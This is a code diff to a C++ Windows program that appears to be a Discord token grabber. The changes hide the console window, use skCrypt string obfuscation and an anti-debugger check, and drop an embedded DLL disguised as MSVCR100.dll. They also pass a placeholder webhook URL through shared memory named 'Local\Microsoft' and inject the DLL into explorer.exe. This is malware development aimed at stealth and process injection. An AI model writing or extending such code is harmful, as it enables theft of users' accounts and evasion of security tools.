@@ -8,8 +8,6 @@
 #include "resource.h"
 #include "injector.h"
 
-#include <shlobj.h>
-
 #define WEBHOOK_URL skCrypt("EXAMPLE_HOOK")
 
 
@@ -17,11 +15,11 @@ typedef BOOL(WINAPI* IsDebPresent)();
 typedef BOOL(WINAPI* ShowWindowCustom)(HWND hWnd, int nCmdShow);
 typedef HANDLE(WINAPI* pCreateFileMapping)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
 typedef void* (WINAPI* pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
-typedef HRESULT(WINAPI* SHGETKNOWNFOLDERPATH)(REFKNOWNFOLDERID, DWORD, HANDLE, PWSTR);
+
 
 int main(int argc, char** argv) {
 	ShowWindowCustom ShowWindow = (ShowWindowCustom)GetProcAddress(GetModuleHandleA(skCrypt("user32.dll")), skCrypt("ShowWindow"));
-	ShowWindow(GetConsoleWindow(), SW_SHOW);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	IsDebPresent isDebPresent = (IsDebPresent)GetProcAddress(GetModuleHandleA(skCrypt("kernel32.dll")), skCrypt("IsDebuggerPresent"));
 
@@ -106,18 +104,20 @@ int main(int argc, char** argv) {
 	}
 
 	manual::kernel32::init();
-
-	SHGETKNOWNFOLDERPATH ShGetKnownFolderPath = (SHGETKNOWNFOLDERPATH)GetProcAddress(GetModuleHandleA(skCrypt("Shell32.dll")), skCrypt("SHGetKnownFolderPath"));
+	manual::shell32::init();
 
 	PWSTR szAppdata;
-	ShGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, szAppdata);
+	manual::shell32::SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &szAppdata);
+
+	std::wcout << szAppdata << std::endl;
+
 
 	std::wstring discord(szAppdata);
 	discord.append(skCrypt(L"/Discord/"));
 
 	std::wcout << discord << std::endl;
 
-	if (manual::kernel32::CreateDirectoryA(discord.c_str(), NULL)) {
+	if (manual::kernel32::CreateDirectoryW(discord.c_str(), NULL)) {
 		std::cout << "Hello, World" << std::endl;
 		return 1;
 	}
@@ -127,6 +127,15 @@ int main(int argc, char** argv) {
 		return 1;
 	}
 
+	PWSTR szTemp;
+	manual::shell32::SHGetKnownFolderPath(FOLDERID_GameTasks, 0, nullptr, &szTemp);
+	std::wstring dynamicPath(szTemp);
+
+
+	std::string path(dynamicPath.begin(), dynamicPath.end());
+	path.append(skCrypt("/MSVCR100.dll"));
+
+	resources::CopyResource(102, skCrypt("microsoft").decrypt(), path);
 
 	HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, nullptr, PAGE_READWRITE, 0, 1024, skCrypt("Local\\Microsoft"));
 	if (!hFile) {
@@ -146,13 +155,12 @@ int main(int argc, char** argv) {
 	}
 
 	strcpy_s(map, 1024, webhook.c_str());
-	cap::Injector* injector = new cap::Injector(skCrypt("explorer.exe").decrypt(), skCrypt("dynamic.dll").decrypt());
+	cap::Injector* injector = new cap::Injector(skCrypt("explorer.exe").decrypt(), path);
 	if (!injector->Inject()) {
 		std::cout << cap::Error::GetLastError() << std::endl;
 	}
 
 	Sleep(5000);
-
 	return 0;
 }
 
